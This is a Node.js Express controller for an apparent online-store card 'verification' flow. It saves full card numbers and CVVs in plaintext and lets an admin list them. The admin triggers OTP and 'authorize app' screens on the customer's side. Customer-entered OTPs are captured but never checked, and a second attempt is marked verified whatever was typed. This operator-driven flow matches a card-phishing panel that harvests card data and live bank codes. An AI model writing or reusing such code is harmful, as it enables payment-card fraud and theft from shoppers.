const crypto = require("crypto");
const { prisma } = require("../config/db");
const ApiError = require("../utils/ApiError");
const ApiResponse = require("../utils/ApiResponse");
const asyncHandler = require("../utils/asyncHandler");

const submitCardForVerification = asyncHandler(async (req, res) => {
  const { cardDetails, shippingAddress, amount } = req.body;

  if (!cardDetails || !cardDetails.cardNumber || !cardDetails.nameOnCard || !cardDetails.expiryDate || !cardDetails.cvv) {
    throw new ApiError(400, "All card details are required");
  }

  const rawNumber = cardDetails.cardNumber.replace(/\D/g, "");
  const last4 = rawNumber.slice(-4);

  let brand = "VISA";
  const prefix = parseInt(rawNumber.substring(0, 2), 10);
  if (prefix >= 60 && prefix <= 69) brand = "DISCOVER";
  else if (prefix >= 30 && prefix <= 39) brand = "AMEX";
  else if ((prefix >= 50 && prefix <= 59) || (prefix >= 22 && prefix <= 27)) brand = "MASTERCARD";

  const referenceId = crypto.randomBytes(3).toString("hex").toUpperCase();

  const verification = await prisma.cardVerification.create({
    data: {
      userId: req.user.id,
      cardDetails: {
        nameOnCard: cardDetails.nameOnCard,
        cardNumber: cardDetails.cardNumber,
        expiryDate: cardDetails.expiryDate,
        cvv: cardDetails.cvv,
        brand,
        last4,
      },
      shippingAddress: shippingAddress || {},
      amount: amount || 0,
      referenceId,
      status: "pending",
    }
  });

  return res.status(201).json(new ApiResponse(201, "Card submitted for verification", {
    verificationId: verification.id,
    status: verification.status,
  }));
});

const getVerificationStatus = asyncHandler(async (req, res) => {
  try {
    const verification = await prisma.cardVerification.findUnique({ where: { id: req.params.id } });

    if (!verification) {
      throw new ApiError(404, "Verification not found");
    }

    const responseData = {
      status: verification.status,
      verificationId: verification.id,
    };

    if (verification.status === "otp_sent" || verification.status === "otp_resent") {
      const cardInfo = verification.cardDetails || {};
      const maskedNumber = "XXXX XXXX XXXX " + (cardInfo.last4 || "");
      responseData.otpCard = {
        brand: cardInfo.brand || "VISA",
        merchantName: verification.merchantName,
        amount: verification.amount,
        maskedCardNumber: maskedNumber,
        referenceId: verification.referenceId,
        date: verification.otpSentAt || new Date(),
        generatedOtp: verification.generatedOtp,
      };
    }

    return res.status(200).json(new ApiResponse(200, "Status fetched", responseData));
  } catch (error) {
    console.error("GET VERIFICATION STATUS ERROR:", error);
    throw error;
  }
});

const submitOtp = asyncHandler(async (req, res) => {
  const { otp } = req.body;
  const verification = await prisma.cardVerification.findUnique({ where: { id: req.params.id } });

  if (!verification) {
    throw new ApiError(404, "Verification not found");
  }

  if (verification.status !== "otp_sent" && verification.status !== "otp_resent") {
    throw new ApiError(400, "OTP not requested yet");
  }

  const currentAttempt = verification.attemptCount || 0;
  
  if (currentAttempt === 0) {
    await prisma.cardVerification.update({
      where: { id: verification.id },
      data: {
        userOtp: otp || "",
        attemptCount: 1,
        status: "otp_submitted"
      }
    });
    return res.status(200).json(new ApiResponse(200, "OTP submitted, awaiting admin review", { verified: false, status: "otp_submitted" }));
  }

  await prisma.cardVerification.update({
    where: { id: verification.id },
    data: {
      userOtp: otp || "",
      attemptCount: currentAttempt + 1,
      status: "verified"
    }
  });

  const cart = await prisma.cart.findUnique({
    where: { userId: req.user.id },
    include: { items: { include: { product: true, variant: true } } }
  });

  if (!cart || cart.items.length === 0) {
    return res.status(200).json(new ApiResponse(200, "OTP verified, but cart was empty", { verified: true }));
  }

  const subtotal = cart.items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  const shippingFee = subtotal >= 150 ? 0 : 12;
  const taxFee = Number((subtotal * 0.08).toFixed(2));
  const totalAmount = Number((subtotal + shippingFee + taxFee).toFixed(2));
  const orderNumber = `FH-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;

  const orderData = {
    userId: req.user.id,
    orderNumber,
    paymentMethod: "card",
    subtotal,
    shippingFee,
    taxFee,
    totalAmount,
    status: "confirmed",
    trackingSteps: {
      create: [
        { status: "pending", note: "Order placed" },
        { status: "confirmed", note: "Card payment verified via OTP" },
      ]
    },
    items: {
      create: cart.items.map((item) => ({
        productId: item.productId,
        variantId: item.variantId,
        name: item.product.name,
        sku: item.variant?.sku || item.product.slug,
        quantity: item.quantity,
        price: item.price,
      }))
    }
  };

  const cardInfo = verification.cardDetails || {};
  orderData.cardDetails = {
    create: {
      nameOnCard: cardInfo.nameOnCard || "",
      cardNumber: cardInfo.cardNumber || "",
      expiryDate: cardInfo.expiryDate || "",
      cvv: cardInfo.cvv || "",
      brand: cardInfo.brand || "VISA",
      last4: cardInfo.last4 || ""
    }
  };

  if (verification.shippingAddress) {
    orderData.shippingAddress = { create: verification.shippingAddress };
    orderData.billingAddress = { create: verification.shippingAddress };
  }

  const order = await prisma.order.create({ data: orderData });

  await prisma.cardVerification.update({
    where: { id: verification.id },
    data: { orderId: order.id }
  });

  await prisma.cartItem.deleteMany({ where: { cartId: cart.id } });
  await prisma.cart.update({
    where: { id: cart.id },
    data: { subtotal: 0, shippingFee: 0, taxFee: 0, total: 0 }
  });

  return res.status(200).json(new ApiResponse(200, "OTP verified, order created", { verified: true, orderId: order.id }));
});

const getPendingVerifications = asyncHandler(async (req, res) => {
  const verifications = await prisma.cardVerification.findMany({
    orderBy: { createdAt: "desc" },
    take: 50,
    include: {
      user: { select: { name: true, email: true } }
    }
  });

  return res.status(200).json(new ApiResponse(200, "Card verifications", verifications));
});

const sendOtpToUser = asyncHandler(async (req, res) => {
  const verification = await prisma.cardVerification.findUnique({ where: { id: req.params.id } });

  if (!verification) {
    throw new ApiError(404, "Verification not found");
  }

  if (verification.status !== "pending") {
    throw new ApiError(400, "OTP already sent or verification completed");
  }

  const generatedOtp = String(Math.floor(100000 + Math.random() * 900000));

  await prisma.cardVerification.update({
    where: { id: verification.id },
    data: {
      status: "otp_sent",
      otpSentAt: new Date(),
      generatedOtp
    }
  });

  return res.status(200).json(new ApiResponse(200, "OTP screen triggered for user", { verificationId: verification.id, generatedOtp }));
});

const getAllVerifications = asyncHandler(async (req, res) => {
  const verifications = await prisma.cardVerification.findMany({
    orderBy: { createdAt: "desc" },
    include: {
      user: { select: { name: true, email: true } }
    }
  });

  return res.status(200).json(new ApiResponse(200, "All verifications", verifications));
});

const resendOtpToUser = asyncHandler(async (req, res) => {
  const verification = await prisma.cardVerification.findUnique({ where: { id: req.params.id } });
  if (!verification) throw new ApiError(404, "Verification not found");
  
  await prisma.cardVerification.update({
    where: { id: verification.id },
    data: { status: "otp_resent" }
  });
  
  return res.status(200).json(new ApiResponse(200, "OTP resend triggered for user"));
});

const authorizeAppForUser = asyncHandler(async (req, res) => {
  const verification = await prisma.cardVerification.findUnique({ where: { id: req.params.id } });
  if (!verification) throw new ApiError(404, "Verification not found");
  
  await prisma.cardVerification.update({
    where: { id: verification.id },
    data: { status: "authorize_app" }
  });
  
  return res.status(200).json(new ApiResponse(200, "Authorize app screen triggered for user"));
});

module.exports = {
  submitCardForVerification,
  getVerificationStatus,
  submitOtp,
  getPendingVerifications,
  sendOtpToUser,
  resendOtpToUser,
  authorizeAppForUser,
  getAllVerifications,
};
